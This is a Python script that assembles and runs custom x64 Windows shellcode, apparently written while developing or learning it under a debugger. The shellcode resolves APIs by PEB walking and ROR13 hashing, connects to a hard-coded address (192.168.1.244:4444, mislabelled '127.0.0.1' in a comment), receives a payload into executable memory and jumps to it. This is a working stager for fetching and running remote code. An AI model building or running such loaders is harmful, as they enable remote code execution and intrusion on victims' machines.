import subprocess
import ctypes
import os
import tempfile

def assemble_shellcode():
    asm_code = r"""
bits 64

%define PTR_VIRTUALALLOC 0
%define PTR_LOADLIBA     1
%define PTR_WSASTARTUP   2
%define PTR_SOCKET       3
%define PTR_CONNECT      4
%define PTR_RECV         5
%define PTR_WSAGETLASTERROR 6

section .text
    global _start

_start:

    ; make some space on the stack for storage
    sub rsp, 0x28                               ; 40 bytes for first call alignment + shadow
    sub rsp, 0x30                               ; 48 bytes for the pointer table
    ; we now have 0x00 - 0x2F worth of space for the pointer table
    lea r14, [rsp]                              ; r14 will act as our pointer table base
    


    ; PEB-walk to find kernel32.dll base in R15
    mov    rax, [gs:0x60]
    mov    rax, [rax + 0x18]
    mov    rax, [rax + 0x10]
    mov    rax, [rax]
    mov    rax, [rax]
    mov    r15, [rax + 0x30]



    ; parse the export table of kernel32.dll
    mov    rdi, r15
    call   parse_exports


    
    ; - resolve LoadLibraryA (kernel32)
    mov    r9d, 0xEC0E4E8E   ; ROR13("LoadLibraryA")
    call   find_by_hash      ; returns RBX = address of LoadLibraryA
    mov [r14 + PTR_LOADLIBA*8], rbx

    ; - resolve VirtualAlloc (kernel32)
    mov r9d, 0x91AFCA54         ; ROR13("VirtualAlloc")
    call find_by_hash           ; RBX = &VirtualAlloc
    mov [r14 + PTR_VIRTUALALLOC*8], rbx

                                    ; pop target for the call
    lea    rcx, [rel ws2_str]       ; RCX → "ws2_32.dll"
    xor    rdx, rdx
    mov    rax, [r14 + PTR_LOADLIBA*8]
    sub    rsp, 0x20
    call   rax                      ; LoadLibraryA("ws2_32.dll")
    add    rsp, 0x20
    mov    rdi, rax
    mov    r15, rax


    mov    eax, [rdi + 0x3C]        ; e_lfanew
    lea    rcx, [rdi + rax]         ; &IMAGE_NT_HEADERS
    mov    edx, [rcx + 0x88]        ; export-dir RVA
    add    rdx, rdi                 ; VA of IMAGE_EXPORT_DIRECTORY

    mov    r10d, [rdx + 0x18]       ; NumberOfNames
    mov    r9d, [rdx + 0x10]       ; BaseOrdinal

    mov    eax, [rdx + 0x20]        ; AddressOfNames RVA
    lea    r11, [rdi + rax]         ; VA AddressOfNames[]

    mov    eax, [rdx + 0x24]        ; AddressOfNameOrdinals RVA
    lea    r12, [rdi + rax]         ; VA AddressOfNameOrdinals[]

    mov    eax, [rdx + 0x1C]        ; AddressOfFunctions RVA
    lea    r13, [rdi + rax]         ; VA AddressOfFunctions[]



    ;  resolve WSAStartup 
    mov   r9d, 0x3bfcedcb     ; precompute with Python
    call  find_by_hash                 ; RBX = &WSAStartup
    mov   [r14 + PTR_WSASTARTUP*8], rbx

    ;  resolve socket 
    mov   r9d, 0x492F0B6E              ; ROR13("socket")
    call  find_by_hash                 ; RBX = &socket
    mov   [r14 + PTR_SOCKET*8], rbx

    ;  resolve connect 
    mov   r9d, 0x60AAF9EC              ; ROR13("connect")
    call  find_by_hash                 ; RBX = &connect
    mov   [r14 + PTR_CONNECT*8], rbx

    ;  resolve recv 
    mov   r9d, 0xE71819B6              ; ROR13("recv")
    call  find_by_hash                 ; RBX = &recv
    mov   [r14 + PTR_RECV*8], rbx

    ;  resolve WSAGetLastError
    mov   r9d, 0x9f5b7976                ; compute ROR13("WSAGetLastError") in Python
    call  find_by_hash                 ; RBX = &WSAGetLastError
    mov   [r14 + PTR_WSAGETLASTERROR*8], rbx


; ------------ Now we start calling the functions below ---------------------

    ; 1) VirtualAlloc(NULL, <SIZE>, MEM_COMMIT/RESERVE, PAGE_EXECUTE_READWRITE)
    mov rax, [r14 + PTR_VIRTUALALLOC*8]
    xor rcx, rcx
    mov rdx, 0x200
    mov r8d, 0x3000
    mov r9d, 0x40
    sub rsp, 0x20

    call rax
    add rsp, 0x20
    mov r12, rax



    ; 2) WSAStartup(MAKEWORD(2,2), &wsadata)
    mov rax, [r14 + PTR_WSASTARTUP*8]
    sub rsp, 0x20
    sub rsp, 0x200
    mov ecx, 0x0202
    lea rdx, [rsp]
    call rax
    add rsp, 0x200
    add rsp, 0x20



    ; 3) socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    mov rax, [r14 + PTR_SOCKET*8]
    mov rcx, 2                          ; AF_INET
    mov rdx, 1                          ; SOCK_STREAM
    mov r8d, 6                          ; IPPROTO_TCP
    sub rsp, 0x20
    call rax
    add rsp, 0x20
    mov r13, rax


    ; 4) connect(sock, addr, sizeof(addr))
    mov   rax, [r14 + PTR_CONNECT*8]
    sub   rsp, 0x30          ; 0x30 = 48 = 32‑byte shadow + 16‑byte sockaddr
    lea   rbx, [rsp+0x28]    ; RCX for sockaddr starts 32 bytes down
    mov   word [rbx+0], 2
    mov   word [rbx+2], 0x5c11
    mov   dword [rbx+4], 0xF401A8C0     ;127.0.0.1
    mov   rcx, r13
    mov   rdx, rbx
    mov   r8d, 16
    call   [r14 + PTR_CONNECT*8]
    add rsp, 0x30


    ; 5) recv(sock, buffer, <SIZE>, 0)
    mov rcx, r13                        ; the socket handle
    mov rdx, r12                        ; buffer = allocated exec buffer
    mov r8d, 0x200                    ; len
    xor r9d, r9d                        ; flags = 0 
    sub rsp, 0x20
    call   [r14 + PTR_RECV*8]
    add rsp, 0x20
    jmp r12 
    

          



; parse_exports:
;   In:  RDI = module_base
;   Out: R10D = NumberOfNames
;        R11  = VA AddressOfNames[]
;        R12  = VA AddressOfNameOrdinals[]
;        R13  = VA AddressOfFunctions[]
;        r9d = BaseOrdinal
; Clobbers: RAX, RCX, RDX
parse_exports:
    mov    eax, [rdi + 0x3C]    ; e_lfanew (DWORD)
    lea    rcx, [rdi + rax]     ; &IMAGE_NT_HEADERS

    mov    edx, [rcx + 0x88]    ; export-dir RVA (DWORD)
    add    rdx, rdi             ; VA of IMAGE_EXPORT_DIRECTORY

    mov    r10d, [rdx + 0x18]   ; NumberOfNames (DWORD)
    mov    r9d, [rdx + 0x10]   ; BaseOrdinal (DWORD)

    ; load the three RVAs as 32-bit, zero-extend, then add base
    mov    eax, [rdx + 0x20]    ; AddressOfNames RVA (DWORD)
    lea    r11, [rdi + rax]     ; VA AddressOfNames[]

    mov    eax, [rdx + 0x24]    ; AddressOfNameOrdinals RVA
    lea    r12, [rdi + rax]     ; VA AddressOfNameOrdinals[]

    mov    eax, [rdx + 0x1C]    ; AddressOfFunctions RVA
    lea    r13, [rdi + rax]     ; VA AddressOfFunctions[]

    ret

; find_by_hash:
;   In:  R9D = target hash
;        R15 = module_base
;        R10D = NumberOfNames
;        R11  = VA AddressOfNames[]
;        R12  = VA AddressOfNameOrdinals[]
;        R13  = VA AddressOfFunctions[]
;   Out: RBX = VA of the function (or 0)
; Clobbers: RDI, RSI, RDX, ECX, EBX
find_by_hash:
    xor    rdi, rdi            ; index = 0

loop:
    cmp    rdi, r10
    jae    not_found

    mov    esi, [r11 + rdi*4]  ; NameRVA
    add    rsi, r15            ; RSI -> VA of name string

    xor    ecx, ecx            ; hash accumulator = 0

hash:
    movzx  ebx, byte [rsi]     ; load next char
    test   bl, bl
    jz     done
    ror    ecx, 13
    add    ecx, ebx
    inc    rsi
    jmp    hash

done:
    cmp    ecx, r9d
    jne    next

    movzx  ecx, word [r12 + rdi*2] ; ordinal index
    mov    eax, [r13 + rcx*4]      ; function RVA
    lea    rbx, [r15 + rax]        ; function VA
    ret

next:
    inc    rdi
    jmp    loop

not_found:
    xor    rbx, rbx
    ret

ws2_str: 
    db "ws2_32.dll", 0

    """

    # Create a temporary directory for the assembly and binary files
    temp_dir = tempfile.gettempdir()
    asm_path = os.path.join(temp_dir, "shellcode.asm")
    bin_path = os.path.join(temp_dir, "shellcode.bin")

    # Write the NASM assembly to a file
    with open(asm_path, "w", encoding="utf-8") as f:
        f.write(asm_code)

    # Assemble the shellcode with NASM
    subprocess.run(["nasm", "-f", "bin", asm_path, "-o", bin_path], check=True)

    # Read the resulting raw shellcode bytes
    with open(bin_path, "rb") as f:
        shellcode = bytearray(f.read())

    print("[+] Shellcode bytes:", ''.join(f"\\x{b:02x}" for b in shellcode))
    print("[+] Shellcode length:", len(shellcode))
    return shellcode

def run_shellcode(shellcode):
    print("Attaching debugger to PID", os.getpid())
    subprocess.Popen(["WinDbgX", "/g", "/p", str(os.getpid())], shell=True)
    input("Press ENTER to run shellcode...")

    # Setup argument types
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    ctypes.windll.kernel32.CreateThread.argtypes = (
        ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
        ctypes.POINTER(ctypes.c_int))

    # Allocate memory and copy shellcode
    space = ctypes.windll.kernel32.VirtualAlloc(
        0, len(shellcode), 0x3000, 0x40)
    buff = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_void_p(space), buff, len(shellcode))

    # Execute shellcode in a new thread
    handle = ctypes.windll.kernel32.CreateThread(
        0, 0, ctypes.c_void_p(space), 0, 0, ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

def main():
    shellcode = assemble_shellcode()
    run_shellcode(shellcode)

if __name__ == "__main__":
    main()
